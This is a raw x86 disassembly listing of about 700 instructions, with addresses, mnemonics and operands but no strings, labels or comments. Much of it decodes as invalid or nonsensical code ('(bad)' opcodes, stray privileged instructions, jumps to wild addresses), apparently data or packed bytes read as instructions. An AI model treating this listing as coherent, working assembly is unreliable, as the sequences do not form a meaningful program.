  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
  41a059:	enter  0x9fc0,0xa5
  41a05d:	rol    BYTE PTR [eax],0x5e
  41a060:	mov    ecx,ecx
  41a062:	or     al,0xc
  41a064:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  41a06b:	jmp    0x41a06c
  41a06d:	push   ebp
  41a06e:	mov    esp,ebp
  41a070:	cld    
  41a071:	inc    ebp
  41a072:	inc    ebp
  41a073:	or     DWORD PTR [ecx+0x457dec10],0x0
  41a07a:	push   esi
  41a07b:	push   esi
  41a07c:	mov    edi,0x7af080f
  41a081:	add    bh,al
  41a083:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  41a08a:	mov    DWORD PTR [edi],ecx
  41a08c:	adc    BYTE PTR [eax+0x45],al
  41a08f:	mov    ebp,eax
  41a091:	mov    ebp,edi
  41a093:	lock call edx
  41a096:	fcom   DWORD PTR [ebp+0x45]
  41a099:	mov    eax,0x148a8b
  41a09e:	push   ecx
  41a09f:	enter  0xc145,0x83
  41a0a3:	cmp    ecx,DWORD PTR [eax]
  41a0a5:	add    BYTE PTR [ebp+0x4d],al
  41a0a8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  41a0ae:	call   0xffa19c1d
  41a0b3:	cmp    eax,DWORD PTR [ebp-0xc]
  41a0b6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  41a0ba:	push   ebp
  41a0bb:	(bad)  
  41a0bc:	call   0x329ec0
  41a0c1:	mov    bh,0xdb
  41a0c3:	cld    
  41a0c4:	or     BYTE PTR [ebp+0x45],bl
  41a0c7:	(bad)  
  41a0c8:	call   0xff7b9d58
  41a0cd:	add    al,BYTE PTR [ebp+0x37]
  41a0d0:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  41a0d6:	jne    0x41a0d8
  41a0d8:	(bad)  
  41a0d9:	cmp    edi,esp
  41a0db:	jne    0x41a10e
  41a0dd:	mov    edi,edi
  41a0df:	or     BYTE PTR [ebx-0x307f0b49],cl
  41a0e5:	pop    ds
  41a0e6:	into   
  41a0e7:	je     0x41a0aa
  41a0e9:	mov    ebx,DWORD PTR [esi]
  41a0eb:	or     BYTE PTR [ebp-0x49],al
  41a0ee:	mov    esp,DWORD PTR [esi-0x77]
  41a0f1:	mov    esi,0x4451f0c
  41a0f6:	mov    eax,DWORD PTR [eax]
  41a0f8:	or     al,0x66
  41a0fa:	sar    bl,0x3b
  41a0fd:	xor    esi,DWORD PTR [ebp+0x66]
  41a100:	xor    ecx,edi
  41a102:	pop    edi
  41a103:	adc    bl,BYTE PTR [ebx+0x70]
  41a106:	ret    0xff
  41a109:	cld    
  41a10a:	inc    ebp
  41a10b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  41a111:	cld    
  41a112:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  41a119:	push   0xffffff83
  41a11b:	pop    edi
  41a11c:	or     BYTE PTR [ebp+0x53],dh
  41a11f:	xorps  xmm1,xmm2
  41a122:	test   BYTE PTR [eax+eax*1],bh
  41a125:	add    BYTE PTR [eax],al
  41a127:	adc    eax,eax
  41a129:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  41a131:	jmp    DWORD PTR [eax]
  41a133:	ror    al,0x5e
  41a136:	inc    ebp
  41a137:	leave  
  41a138:	xor    ecx,DWORD PTR [eax]
  41a13a:	and    DWORD PTR [ebx-0x3ec10708],ecx
  41a140:	add    ah,al
  41a142:	xor    edi,edi
  41a144:	xor    DWORD PTR [ebx],0x66003304
  41a14a:	mov    DWORD PTR [ebp-0xc],ecx
  41a14d:	pcmpgtw mm0,mm0
  41a150:	add    dl,ah
  41a152:	leave  
  41a153:	mov    edi,DWORD PTR [esi-0x7d]
  41a156:	push   ax
  41a158:	dec    ebp
  41a159:	mov    esi,DWORD PTR [ebx-0x75]
  41a15c:	lea    ebp,[eax-0x7c00ff04]
  41a162:	xor    eax,DWORD PTR [eax]
  41a164:	sysret 
  41a166:	dec    ebp
  41a167:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  41a16e:	push   WORD PTR [ecx+0x8]
  41a172:	jne    0x41a135
  41a174:	ud0    ecx,DWORD PTR [ecx]
  41a177:	mov    eax,edx
  41a179:	lods   al,BYTE PTR ds:[esi]
  41a17a:	add    BYTE PTR [eax],al
  41a17c:	data16 (bad) 
  41a17e:	iret   
  41a17f:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  41a186:	cli    
  41a187:	inc    ebp
  41a188:	cmp    al,0x8d
  41a18a:	add    BYTE PTR [esi+0x2d],ah
  41a18d:	inc    ebp
  41a18e:	pop    ebp
  41a18f:	lea    ecx,[edi]
  41a191:	mov    dl,bh
  41a193:	add    BYTE PTR [edi],cl
  41a195:	mov    DWORD PTR [eax+eax*8],edi
  41a198:	mov    ebx,0x3b87
  41a19d:	add    BYTE PTR [ebx],ch
  41a19f:	inc    ebp
  41a1a0:	data16 (bad) 
  41a1a2:	clc    
  41a1a3:	int3   
  41a1a4:	cmp    eax,DWORD PTR [eax]
  41a1a6:	je     0x41a131
  41a1a8:	push   0xffffffc8
  41a1aa:	pop    edi
  41a1ab:	xchg   DWORD PTR [ebp+0x0],eax
  41a1ae:	data16 add BYTE PTR [ebp+0x45],cl
  41a1b2:	lea    cx,[ebp+0x10]
  41a1b6:	jb     0x41a1b8
  41a1b8:	jmp    0x41a143
  41a1ba:	call   eax
  41a1bc:	clc    
  41a1bd:	xchg   DWORD PTR [edi+0x1],edi
  41a1c0:	mov    eax,DWORD PTR [eax]
  41a1c2:	or     BYTE PTR [ebp-0x49],al
  41a1c5:	lea    eax,[eax+0x74003154]
  41a1cb:	push   edi
  41a1cc:	inc    edx
  41a1cd:	jge    0x41a1ce
  41a1cf:	mov    DWORD PTR [edi],ecx
  41a1d1:	fdiv   DWORD PTR [edi-0x6]
  41a1d4:	inc    DWORD PTR [eax]
  41a1d6:	xor    edx,DWORD PTR [eax+0x5f]
  41a1d9:	xchg   DWORD PTR [ebx+0x1],ebx
  41a1dc:	ret    0x0
  41a1df:	xor    BYTE PTR [ebp-0x51],cl
  41a1e2:	cmp    edi,0xf0ff89fc
  41a1e8:	data16 ror al,0x84
  41a1ec:	rol    BYTE PTR [eax],0x3b
  41a1ef:	add    al,dh
  41a1f1:	dec    eax
  41a1f2:	xchg   esp,eax
  41a1f3:	push   ebx
  41a1f4:	jmp    0x41a181
  41a1f6:	push   ebp
  41a1f7:	add    esp,ebp
  41a1f9:	add    ebp,esp
  41a1fb:	mov    edx,DWORD PTR [edi+0x24]
  41a1fe:	clc    
  41a1ff:	dec    esi
  41a200:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  41a206:	cmp    BYTE PTR [ebx],al
  41a208:	jne    0x41a193
  41a20a:	xor    esp,eax
  41a20c:	jmp    0x44a38f
  41a211:	add    ebp,DWORD PTR [ecx+ecx*4]
  41a214:	jne    0x41a20a
  41a216:	call   0xffcb9f70
  41a21b:	clc    
  41a21c:	xchg   edi,eax
  41a21d:	sti    
  41a21e:	add    DWORD PTR [ebx],eax
  41a220:	add    BYTE PTR [ebp+0x47],bl
  41a223:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  41a229:	pop    ebp
  41a22a:	mov    DWORD PTR [esi-0x48],esi
  41a22d:	jmp    0x41a276
  41a22f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  41a235:	(bad)  
  41a237:	cmp    al,0x0
  41a239:	cmp    eax,DWORD PTR [ebp+0x18]
  41a23c:	lea    ebx,[ebp-0x56]
  41a23f:	jle    0x41a241
  41a241:	jae    0x41a1cc
  41a243:	mov    eax,esp
  41a245:	call   0xb900:0x8b005587
  41a24c:	inc    ebp
  41a24d:	push   ebp
  41a24e:	lea    ecx,[ebp-0x27ff4f12]
  41a254:	mov    eax,edi
  41a256:	int3   
  41a257:	push   ebp
  41a258:	xchg   edi,eax
  41a25a:	add    esp,ebp
  41a25c:	add    BYTE PTR [eax],al
  41a25e:	inc    ebp
  41a25f:	add    BYTE PTR [ebp+0x8b3255],cl
  41a265:	cld    
  41a266:	mov    DWORD PTR [edx],edi
  41a268:	aam    0x75
  41a26a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  41a270:	mov    DWORD PTR [ebx-0x50],edx
  41a273:	test   BYTE PTR [ebp-0x1],0xe8
  41a277:	mov    eax,DWORD PTR [eax]
  41a279:	hlt    
  41a27a:	add    al,al
  41a27c:	mov    eax,DWORD PTR ds:0x890045a8
  41a282:	dec    DWORD PTR [ebx+0x45fdf0e8]
  41a288:	inc    DWORD PTR [eax*2+0xf75854d]
  41a28f:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  41a295:	call   0x7297ffd6
  41a29a:	je     0x41a2fa
  41a29c:	js     0x41a2fd
  41a29e:	lock ret 0x7e
  41a2a2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  41a2a8:	mov    edi,edi
  41a2aa:	sbb    al,bl
  41a2ac:	clc    
  41a2ad:	add    BYTE PTR [ebp-0x73],bh
  41a2b0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  41a2b6:	ror    BYTE PTR [eax],1
  41a2b8:	dec    ebp
  41a2b9:	xchg   ebp,eax
  41a2ba:	mov    edi,edi
  41a2bc:	in     al,0x8b
  41a2be:	jge    0x41a249
  41a2c0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  41a2c6:	clc    
  41a2c7:	pop    esi
  41a2c8:	fist   DWORD PTR [ebp+0x5d398b5d]
  41a2ce:	clc    
  41a2cf:	add    al,0x6e
  41a2d1:	mov    eax,DWORD PTR [ebx]
  41a2d3:	mov    BYTE PTR [ebp+0x0],dl
  41a2d6:	mov    edx,DWORD PTR [ebx-0x20]
  41a2d9:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  41a2df:	add    eax,0x3b3b73
  41a2e4:	adc    al,0x89
  41a2e6:	pop    eax
  41a2e7:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  41a2eb:	ret    0xf08
  41a2ee:	cmp    al,0x2
  41a2f0:	mov    edx,eax
  41a2f2:	cld    
  41a2f3:	add    BYTE PTR [ebp+0x66],dl
  41a2f6:	add    eax,ebx
  41a2f8:	add    esp,eax
  41a2fa:	sub    eax,eax
  41a2fc:	or     BYTE PTR [ecx-0x77f474bb],cl
  41a302:	add    BYTE PTR [eax],al
  41a304:	mov    DWORD PTR [ebx-0x24],ebx
  41a307:	push   edi
  41a308:	push   ebp
  41a309:	clc    
  41a30a:	add    DWORD PTR [esi+0x1b0100],0x45
  41a311:	out    0xff,eax
  41a313:	add    edx,DWORD PTR [eax]
  41a315:	jmp    0x41a2ff
  41a317:	cmp    ch,0x47
  41a31a:	(bad)  
  41a31b:	jmp    0x40c72b6d
  41a320:	je     0x41a2ac
  41a322:	mov    eax,DWORD PTR [eax-0x10c78f04]
  41a328:	inc    ebp
  41a329:	add    BYTE PTR [ebx-0x770375],al
  41a32f:	add    ah,ch
  41a331:	add    edx,esp
  41a333:	pop    edi
  41a334:	pop    ebp
  41a335:	push   ebp
  41a336:	inc    ebx
  41a337:	in     al,dx
  41a338:	pop    ebp
  41a339:	in     al,dx
  41a33a:	cmp    edx,DWORD PTR [edi-0x8]
  41a33d:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  41a344:	add    al,0x47
  41a346:	push   ebp
  41a347:	mov    esp,ebp
  41a349:	in     al,0x45
  41a34b:	dec    ebp
  41a34c:	push   esi
  41a34d:	test   DWORD PTR [eax+0xfb010f],esi
  41a353:	add    BYTE PTR [eax+0xc018b],dh
  41a359:	leave  
  41a35a:	inc    ebp
  41a35b:	test   al,ch
  41a35d:	add    dh,bh
  41a35f:	add    bh,bh
  41a361:	dec    ebp
  41a362:	push   cs
  41a363:	mov    DWORD PTR [ecx],eax
  41a365:	hlt    
  41a366:	push   es
  41a367:	dec    ebp
  41a368:	leave  
  41a369:	mov    DWORD PTR [eax],ecx
  41a36b:	clc    
  41a36c:	cmovge eax,ecx
  41a36f:	mov    ecx,0x85c2f0
  41a375:	clc    
  41a376:	pop    DWORD PTR [ebp+0x1]
  41a379:	push   ebx
  41a37a:	add    BYTE PTR [ebp-0x15],bh
  41a37d:	push   esi
  41a37e:	xor    eax,0x898a45
  41a383:	cld    
  41a384:	add    al,0x45
  41a386:	add    BYTE PTR [ebx],dh
  41a388:	pushfw 
  41a38a:	add    DWORD PTR [esi+0x78308c1],edi
  41a390:	add    ah,BYTE PTR [edi+esi*4-0x33]
  41a394:	mov    ebx,0xc4e8b
  41a399:	(bad)  
  41a39a:	cmp    ecx,ebx
  41a39c:	jne    0x41a366
  41a39e:	xor    ecx,DWORD PTR [ebp+0x66]
  41a3a1:	jmp    0xc8a3a7
  41a3a6:	add    DWORD PTR [ebp+0x0],eax
  41a3a9:	mov    eax,ebx
  41a3ab:	or     al,0x8b
  41a3ad:	(bad)  
  41a3ae:	mov    ecx,esi
  41a3b0:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  41a3b7:	mov    eax,edi
  41a3b9:	or     BYTE PTR [edx],cl
  41a3bb:	shl    cl,cl
  41a3bd:	icebp  
  41a3be:	add    BYTE PTR [ebp+0x37],0x8b
  41a3c2:	or     BYTE PTR [edx+eax*2],cl
  41a3c5:	(bad)  
  41a3c6:	or     cl,dh
  41a3c8:	stc    
  41a3c9:	shl    DWORD PTR [ebp-0x30],0xc6
  41a3cd:	xor    al,0x0
  41a3cf:	inc    ebp
  41a3d0:	xchg   BYTE PTR [ebx],al
  41a3d2:	add    esp,edi
  41a3d4:	add    BYTE PTR [ebp-0x39],cl
  41a3d7:	mov    al,bl
  41a3d9:	test   DWORD PTR [ebx+0x1c348375],ecx
  41a3df:	sub    al,0xbf
  41a3e1:	jmp    0x41a368
  41a3e3:	mov    edi,eax
  41a3e5:	lock jge 0x41a3d9
  41a3e8:	lea    esi,[edx-0x74bad501]
  41a3ee:	mov    ebp,esp
  41a3f0:	or     cl,dh
  41a3f2:	leave  
  41a3f3:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  41a3fa:	dec    ebp
  41a3fb:	dec    ebp
  41a3fc:	test   DWORD PTR [ebx],eax
  41a3fe:	paddb  mm6,mm0
  41a401:	add    DWORD PTR [eax],eax
  41a403:	dec    ebp
  41a404:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  41a40a:	mov    esi,DWORD PTR [edx]
  41a40c:	or     al,0x2b
  41a40e:	dec    ebp
  41a40f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  41a415:	mov    esp,esi
  41a417:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  41a41e:	mov    DWORD PTR [ebx],ebp
  41a420:	call   0xc752d50
  41a425:	mov    DWORD PTR [ebp+0x10],ecx
  41a428:	(bad)  
  41a429:	push   0x8b85ff10
  41a42e:	clc    
  41a42f:	or     al,0x55
  41a431:	(bad)  
  41a432:	push   ecx
  41a433:	retf   
  41a434:	mov    ebx,0xff4d8dc8
  41a439:	mov    DWORD PTR [ebp+0x8],eax
  41a43c:	xor    eax,DWORD PTR [ebp-0x75]
  41a43f:	cmp    ebp,DWORD PTR [ebx]
  41a441:	lsl    ebx,WORD PTR [edi-0x8]
  41a445:	call   DWORD PTR [ebx-0x741bff75]
  41a44b:	(bad)  
  41a44c:	or     al,0x5b
  41a44e:	dec    ebp
  41a44f:	or     BYTE PTR [ebx],dh
  41a451:	inc    ebp
  41a452:	xor    esi,DWORD PTR ds:0x708088d
  41a458:	in     eax,0x9c
  41a45a:	add    BYTE PTR [edx],dh
  41a45c:	inc    ebp
  41a45d:	pop    edi
  41a45e:	xor    eax,edx
  41a460:	test   DWORD PTR [eax],0x83108b8b
  41a466:	dec    ebp
  41a467:	adc    al,0x33
  41a469:	inc    ebp
  41a46a:	xor    esi,DWORD PTR [ecx]
  41a46c:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  41a473:	test   DWORD PTR [eax],ecx
  41a475:	clc    
  41a476:	inc    ebp
  41a477:	add    ecx,DWORD PTR [ebx+0xc7f445]
  41a47d:	hlt    
  41a47e:	leave  
  41a47f:	test   DWORD PTR [esi],eax
  41a481:	clc    
  41a482:	inc    edi
  41a483:	push   edi
  41a484:	aaa    
  41a485:	inc    ebp
  41a486:	pop    ss
  41a487:	ror    DWORD PTR [ebp-0x29],1
  41a48a:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  41a491:	mov    eax,0x780084d
  41a496:	push   ebp
  41a497:	clc    
  41a498:	ret    0xe99c
  41a49b:	xor    dl,dl
  41a49d:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  41a4a3:	js     0x88830a2
  41a4a9:	dec    ebp
  41a4aa:	push   ebp
  41a4ab:	mov    edi,DWORD PTR [eax+0xc872fc]
  41a4b1:	lock enter 0xceca,0xf2
  41a4b6:	retf   0x18ce
  41a4b9:	jne    0x41a508
  41a4bb:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  41a4c1:	enter  0xf0d6,0xca
  41a4c5:	retf   0xf2c8
  41a4c8:	into   
  41a4c9:	out    dx,al
  41a4ca:	dec    ebp
  41a4cb:	dec    ebp
  41a4cc:	jmp    0xff45a404
  41a4d1:	xor    eax,DWORD PTR [ebp-0x15]
  41a4d4:	xor    esi,DWORD PTR [ebx]
  41a4d6:	mov    esi,DWORD PTR [ebx]
  41a4d8:	sub    eax,DWORD PTR [ebx]
  41a4da:	add    eax,DWORD PTR [ebx]
  41a4dc:	or     bl,dl
  41a4de:	dec    ebp
  41a4df:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  41a4e5:	xor    eax,DWORD PTR [ebp-0xf00073]
  41a4eb:	jb     0x41a532
  41a4ed:	add    BYTE PTR [ebx],dh
  41a4ef:	dec    ebp
  41a4f0:	pop    esi
  41a4f1:	mov    ebp,ebx
  41a4f3:	cld    
  41a4f4:	mov    esi,eax
  41a4f6:	call   0x520ffac3
  41a4fb:	stc    
  41a4fc:	add    eax,0x4572aa
  41a501:	pop    edi
  41a502:	leave  
  41a503:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  41a50a:	in     al,dx
  41a50b:	mov    eax,edi
  41a50d:	xor    eax,0xf8008520
  41a513:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  41a51a:	mov    eax,DWORD PTR [ebp-0x77]
  41a51d:	xor    al,bh
  41a51f:	pushf  
  41a520:	inc    ebp
  41a521:	(bad)  
  41a522:	cmp    eax,ebp
  41a524:	pushf  
  41a525:	xchg   BYTE PTR [esi-0x8],dl
  41a528:	mov    edi,0x8518e4ec
  41a52e:	jmp    0xf056:0x8b457df8
  41a535:	push   ebp
  41a536:	push   ebp
  41a537:	push   ecx
  41a538:	push   ecx
  41a539:	push   edi
  41a53a:	xor    eax,esi
  41a53c:	mov    edx,0x32729c
  41a541:	add    ecx,eax
  41a543:	mov    edx,edi
  41a545:	clc    
  41a546:	retf   0xaf45
  41a549:	cmp    ebx,ebp
  41a54b:	pushf  
  41a54c:	mov    eax,edi
  41a54e:	clc    
  41a54f:	cld    
  41a550:	jne    0x41a56a
  41a552:	xor    ebp,edx
  41a554:	xor    eax,DWORD PTR [ebp+0x3]
  41a557:	or     BYTE PTR [ebx],al
  41a559:	add    BYTE PTR [ebp-0x7747475],al
  41a55f:	hlt    
  41a560:	dec    ebp
  41a561:	dec    ebp
  41a562:	je     0x41a597
  41a564:	xor    esi,DWORD PTR [ebx]
  41a566:	xor    eax,DWORD PTR [ebx]
  41a568:	add    eax,DWORD PTR [ebx]
  41a56a:	add    ecx,DWORD PTR [edi]
  41a56c:	rol    ecx,cl
  41a56e:	mov    esi,DWORD PTR [ecx]
  41a570:	in     al,dx
  41a571:	inc    ebp
  41a572:	enter  0xca2b,0x33
  41a576:	icebp  
  41a577:	mov    DWORD PTR [edx],ecx
  41a579:	clc    
  41a57a:	lock pop ebp
  41a57c:	enter  0xf2e8,0xfe
  41a580:	retf   0xeeff
  41a583:	inc    ebp
  41a584:	jne    0x41a511
  41a586:	mov    edi,eax
  41a588:	cld    
  41a589:	dec    ebp
  41a58a:	enter  0xbc89,0x8d
  41a58e:	pushf  
  41a58f:	sti    
  41a590:	xor    bh,bh
  41a592:	mov    eax,DWORD PTR [ebp-0xc]
  41a595:	mov    esi,DWORD PTR [ebp-0x4]
  41a598:	xor    eax,esi
  41a59a:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  41a5a1:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  41a5a7:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  41a5ad:	(bad)  
  41a5ae:	push   ebp
  41a5af:	shr    esp,0x4d
  41a5b2:	in     al,dx
  41a5b3:	cmp    eax,DWORD PTR [esi+esi*2]
  41a5b6:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  41a5bc:	pushf  
  41a5bd:	mov    edi,0x85c7f445
  41a5c3:	call   0xf8872cc0
  41a5c8:	xor    ebx,ebx
  41a5ca:	pushf  
  41a5cb:	popa   
  41a5cc:	push   ebx
  41a5cd:	dec    ebp
  41a5ce:	inc    ebp
  41a5cf:	mov    esi,DWORD PTR [esi]
  41a5d1:	clc    
  41a5d2:	pushf  
  41a5d3:	into   
  41a5d4:	mov    ecx,edi
  41a5d6:	in     al,dx
  41a5d7:	call   0x8b49eb9a
  41a5dc:	pop    es
  41a5dd:	or     BYTE PTR [ebx],dh
  41a5df:	or     BYTE PTR [edi+0x8a724d],bh
  41a5e5:	or     eax,edi
  41a5e7:	push   ebp
  41a5e8:	inc    ebp
  41a5e9:	cmpxchg8b (bad)
  41a5ea:	(bad)  
  41a5eb:	leave  
  41a5ec:	loopne 0x41a5b8
  41a5ee:	test   DWORD PTR [ebp-0x8],ecx
  41a5f1:	mov    eax,DWORD PTR [ebp-0x18]
  41a5f4:	rcl    DWORD PTR [ebp-0x29],1
  41a5f7:	xor    eax,edi
  41a5f9:	add    esi,eax
  41a5fb:	and    eax,DWORD PTR [eax]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	(bad)  
  41a600:	leave  
  41a601:	sti    
  41a602:	inc    ebp
  41a603:	dec    DWORD PTR [ebx-0x39cc13ab]
  41a609:	mov    esi,ecx
  41a60b:	clc    
  41a60c:	(bad)  
  41a60d:	dec    ebp
  41a60e:	iret   
  41a60f:	xor    ebp,DWORD PTR [edi-0x74f71473]
  41a615:	jb     0x41a613
  41a617:	add    bh,al
  41a619:	inc    ebp
  41a61a:	(bad)  
  41a61b:	mov    eax,DWORD PTR [ebp-0xc]
  41a61e:	(bad)  
  41a61f:	xabort 0x64
  41a622:	loopne 0x41a5f1
  41a624:	jmp    FWORD PTR [ebx]
  41a626:	mov    DWORD PTR [ebx],eax
  41a628:	clc    
  41a629:	lock inc ebp
  41a62b:	dec    ebp
  41a62c:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  41a632:	loopne 0x41a667
  41a634:	inc    DWORD PTR [ebx]
  41a636:	mov    edi,DWORD PTR [ebx]
  41a638:	hlt    
  41a639:	jne    0x41a688
  41a63b:	mov    esi,DWORD PTR [ebx]
  41a63d:	in     al,0x8d
  41a63f:	dec    ebp
  41a640:	or     BYTE PTR [ebx],dh
  41a642:	jb     0x41a647
  41a644:	add    BYTE PTR [edi+0x45],bl
  41a647:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  41a64d:	add    BYTE PTR [ebx],dh
  41a64f:	mov    esi,DWORD PTR [ebx]
  41a651:	sub    DWORD PTR [ebx],0x6c
  41a654:	mov    eax,DWORD PTR [ebp-0x4]
  41a657:	xor    eax,ecx
  41a659:	pushf  
  41a65a:	mov    ecx,0x338545ba
  41a65f:	clc    
  41a660:	add    edx,DWORD PTR [ebp-0x77]
  41a663:	mov    edi,eax
  41a665:	adc    al,0x45
  41a667:	inc    ebp
  41a668:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  41a670:	mov    eax,DWORD PTR [eax]
  41a672:	loopne 0x41a6c1
  41a674:	inc    ebp
  41a675:	mov    esi,DWORD PTR [ebx]
  41a677:	mov    eax,DWORD PTR [ebx]
  41a679:	nop
  41a67a:	rol    DWORD PTR [eax],cl
  41a67c:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  41a682:	mov    cl,BYTE PTR [ecx+0x450bf888]
  41a688:	dec    ebp
  41a689:	push   esi
  41a68a:	mov    edi,DWORD PTR [edi+0x7b608f8]
  41a690:	xor    eax,edi
  41a692:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  41a699:	mov    DWORD PTR [eax],ecx
  41a69b:	in     al,dx
  41a69c:	into   
  41a69d:	inc    ebp
  41a69e:	iret   
  41a69f:	xor    ecx,edx
  41a6a1:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  41a6a8:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  41a6ae:	dec    ebp
  41a6af:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  41a6b5:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  41a6bc:	mov    DWORD PTR [ecx+0x8],eax
  41a6bf:	mov    eax,DWORD PTR [ebp-0x8]
  41a6c2:	xor    ebx,DWORD PTR [eax]
  41a6c4:	mov    ecx,0xff8b8d40
  41a6c9:	clc    
  41a6ca:	enter  0x4d49,0x48
  41a6ce:	mov    eax,edx
  41a6d0:	lock enter 0x4545,0x8b
  41a6d5:	mov    esi,eax
  41a6d7:	cmp    dh,al
  41a6d9:	rol    edi,0x3
  41a6dc:	enter  0x9140,0x89
  41a6e0:	inc    ebp
  41a6e1:	adc    al,0x8b
  41a6e3:	inc    ebp
  41a6e4:	clc    
  41a6e5:	xor    eax,esi
  41a6e7:	add    eax,edi
  41a6e9:	mov    DWORD PTR [esi-0x24],ebx
  41a6ec:	rol    DWORD PTR [ebp-0x37],0x33
  41a6f0:	add    al,0x3
  41a6f2:	push   ebp
  41a6f3:	mov    esp,ebp
  41a6f5:	fsubr  st,st(4)
  41a6f7:	inc    ebp
  41a6f8:	(bad)  
  41a6f9:	mov    edi,esp
  41a6fb:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  41a701:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41a708:	inc    ebp
  41a709:	test   DWORD PTR [ecx+0x454514f8],ecx
  41a70f:	xor    cl,BYTE PTR [ebx+0xc7909c]
  41a715:	fmul   DWORD PTR [ebx+0xf81485]
  41a71b:	test   DWORD PTR [ecx+0x8b0100],ecx
  41a721:	cld    
  41a722:	or     edi,eax
  41a724:	dec    eax
  41a725:	ret    
  41a726:	push   ebx
  41a727:	inc    ebp
  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
